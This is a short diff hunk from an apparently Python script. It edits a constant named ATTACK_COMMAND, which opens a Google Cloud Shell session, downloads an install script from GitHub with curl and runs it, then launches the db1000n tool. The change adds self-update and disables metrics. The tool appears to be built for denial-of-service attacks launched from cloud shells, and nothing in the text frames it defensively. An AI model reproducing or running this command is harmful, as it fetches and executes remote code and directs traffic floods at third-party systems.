@@ -16,7 +16,7 @@ logging.getLogger().setLevel(logging.INFO)
 ATTACK_COMMAND = (
     'gcloud cloud-shell ssh --authorize-session '
     '--command="source <(curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh) '
-    '&& ./db1000n {}"'
+    '&& ./db1000n -enable-self-update -prometheus_on=false {}"'
 )
 
 
